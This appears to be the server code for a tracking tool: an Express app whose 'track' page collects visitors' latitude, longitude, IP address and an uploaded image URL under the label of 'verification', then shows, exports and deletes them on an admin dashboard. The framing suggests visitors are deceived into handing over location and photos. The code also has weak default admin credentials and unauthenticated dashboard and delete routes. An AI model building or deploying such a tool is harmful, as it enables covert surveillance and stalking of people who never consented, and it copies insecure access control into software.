const express = require("express");
const mongoose = require("mongoose");
const axios = require("axios");
const dotenv = require("dotenv");

dotenv.config();

const app = express();
app.set("view engine", "ejs");
app.set("views", __dirname + "/views");

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public")); // For serving static files if needed

// MongoDB Connection
mongoose.connect(process.env.MONGO_URL)
  .then(() => console.log("✅ MongoDB Connected Successfully"))
  .catch(err => {
    console.error("❌ MongoDB Connection Error:", err);
    process.exit(1);
  });

/* 📍 Schema */
const LocationSchema = new mongoose.Schema({
  lat: String,
  lon: String,
  ip: String,
  imageUrl: String,
  createdAt: { type: Date, default: Date.now }
});

const Location = mongoose.model("Location", LocationSchema);

/* 🎯 Track Page */
app.get("/", (req, res) => {
  // Pass Cloudinary config to the template
  res.render("track", {
    CLOUDINARY_URL: process.env.CLOUDINARY_URL || "https://api.cloudinary.com/v1_1/YOUR_CLOUD_NAME/image/upload",
    CLOUDINARY_UPLOAD_PRESET: process.env.CLOUDINARY_UPLOAD_PRESET || "YOUR_UPLOAD_PRESET"
  });
});

/* 💾 SAVE DATA */
app.post("/save", async (req, res) => {
  try {
    const { lat, lon, imageUrl } = req.body;
    
    // Get client IP (trying multiple methods)
    let ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] || 
             req.socket.remoteAddress || 
             "Unknown";
    
    // If IP is an array, take the first one
    if (Array.isArray(ip)) ip = ip[0];
    
    // If IP is in format "::ffff:192.168.1.1", extract the IPv4
    if (ip.includes('::ffff:')) {
      ip = ip.split('::ffff:')[1];
    }
    
    // If we can't get IP from headers, use external API
    if (ip === "Unknown" || ip === "::1" || ip === "127.0.0.1") {
      try {
        const ipResponse = await axios.get("https://api.ipify.org?format=json", { timeout: 5000 });
        ip = ipResponse.data.ip;
      } catch (ipError) {
        console.warn("Could not fetch external IP:", ipError.message);
        ip = "IP Unavailable";
      }
    }
    
    // Validate data
    if (!lat || !lon || !imageUrl) {
      return res.status(400).json({ 
        success: false, 
        error: "Missing required fields" 
      });
    }
    
    // Create new record
    const newLocation = await Location.create({ 
      lat, 
      lon, 
      ip, 
      imageUrl 
    });
    
    console.log(`📥 New verification saved: ${ip} - ${lat},${lon}`);
    
    res.json({ 
      success: true, 
      id: newLocation._id,
      message: "Verification data saved successfully"
    });
    
  } catch (error) {
    console.error("❌ Save error:", error);
    res.status(500).json({ 
      success: false, 
      error: error.message || "Internal server error" 
    });
  }
});

/* 🔐 LOGIN PAGE */
app.get("/admin", (req, res) => {
  const error = req.query.error;
  res.render("login", { error });
});

/* ✅ ADMIN LOGIN AUTHENTICATION */
app.post("/admin/login", async (req, res) => {
  try {
    const { username, password } = req.body;
    const ADMIN_USER = process.env.ADMIN_USER || "admin";
    const ADMIN_PASS = process.env.ADMIN_PASS || "admin123";
    
    if (username === ADMIN_USER && password === ADMIN_PASS) {
      // In production, use sessions or JWT tokens
      res.json({ 
        success: true, 
        redirect: "/admin/dashboard" 
      });
    } else {
      res.status(401).json({ 
        success: false, 
        error: "Invalid credentials" 
      });
    }
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: "Login failed" 
    });
  }
});

/* 📊 DASHBOARD */
app.get("/admin/dashboard", async (req, res) => {
  try {
    // In production, add proper authentication middleware here
    
    // Get pagination parameters
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const skip = (page - 1) * limit;
    
    // Get total count
    const total = await Location.countDocuments();
    
    // Get data with pagination
    const data = await Location.find()
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(limit);
    
    res.render("index", { 
      data,
      currentPage: page,
      totalPages: Math.ceil(total / limit),
      totalRecords: total,
      limit: limit
    });
    
  } catch (error) {
    console.error("❌ Dashboard error:", error);
    res.status(500).send("Error loading dashboard");
  }
});

/* 🔍 GET SINGLE RECORD */
app.get("/api/record/:id", async (req, res) => {
  try {
    const record = await Location.findById(req.params.id);
    if (!record) {
      return res.status(404).json({ success: false, error: "Record not found" });
    }
    res.json({ success: true, data: record });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

/* 🗑 DELETE SINGLE */
app.post("/delete/:id", async (req, res) => {
  try {
    const record = await Location.findByIdAndDelete(req.params.id);
    if (!record) {
      return res.status(404).json({ success: false, error: "Record not found" });
    }
    console.log(`🗑 Deleted record: ${record._id}`);
    res.redirect("/admin/dashboard");
  } catch (error) {
    console.error("❌ Delete error:", error);
    res.status(500).send("Error deleting record");
  }
});

/* 🗑 DELETE ALL */
app.post("/delete-all", async (req, res) => {
  try {
    const result = await Location.deleteMany({});
    console.log(`🗑 Deleted ${result.deletedCount} records`);
    res.redirect("/admin/dashboard");
  } catch (error) {
    console.error("❌ Delete all error:", error);
    res.status(500).send("Error deleting all records");
  }
});

/* 📈 STATISTICS ENDPOINT */
app.get("/api/stats", async (req, res) => {
  try {
    const total = await Location.countDocuments();
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const todayCount = await Location.countDocuments({
      createdAt: { $gte: today }
    });
    
    // Get unique IPs
    const uniqueIPs = await Location.distinct("ip");
    
    // Get hourly data for last 24 hours
    const last24Hours = new Date(Date.now() - 24 * 60 * 60 * 1000);
    const hourlyData = await Location.aggregate([
      {
        $match: {
          createdAt: { $gte: last24Hours }
        }
      },
      {
        $group: {
          _id: {
            hour: { $hour: "$createdAt" },
            date: { $dateToString: { format: "%Y-%m-%d", date: "$createdAt" } }
          },
          count: { $sum: 1 }
        }
      },
      {
        $sort: { "_id.date": 1, "_id.hour": 1 }
      }
    ]);
    
    res.json({
      success: true,
      data: {
        totalRecords: total,
        todayCount: todayCount,
        uniqueIPs: uniqueIPs.length,
        hourlyData: hourlyData
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

/* 📍 EXPORT DATA */
app.get("/export/csv", async (req, res) => {
  try {
    const data = await Location.find().sort({ createdAt: -1 });
    
    // Convert to CSV
    let csv = "Latitude,Longitude,IP,Image URL,Created At\n";
    
    data.forEach(item => {
      csv += `"${item.lat}","${item.lon}","${item.ip}","${item.imageUrl}","${item.createdAt.toISOString()}"\n`;
    });
    
    res.header('Content-Type', 'text/csv');
    res.attachment('verification-data.csv');
    res.send(csv);
    
  } catch (error) {
    console.error("❌ Export error:", error);
    res.status(500).send("Error exporting data");
  }
});

/* 🏠 HEALTH CHECK */
app.get("/health", (req, res) => {
  res.json({ 
    status: "OK", 
    timestamp: new Date().toISOString(),
    mongo: mongoose.connection.readyState === 1 ? "Connected" : "Disconnected"
  });
});

/* ⚙️ ERROR HANDLER */
app.use((err, req, res, next) => {
  console.error("❌ Server Error:", err.stack);
  res.status(500).send("Something broke! Please try again later.");
});

/* 🚀 START SERVER */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`
  🚀 Server running on: http://localhost:${PORT}
  📊 Dashboard: http://localhost:${PORT}/admin
  🎯 Tracking: http://localhost:${PORT}
  📈 Stats: http://localhost:${PORT}/api/stats
  `);
});

// Graceful shutdown
process.on('SIGINT', async () => {
  console.log('\n\n🔴 Server shutting down...');
  await mongoose.connection.close();
  console.log('✅ MongoDB connection closed');
  process.exit(0);
});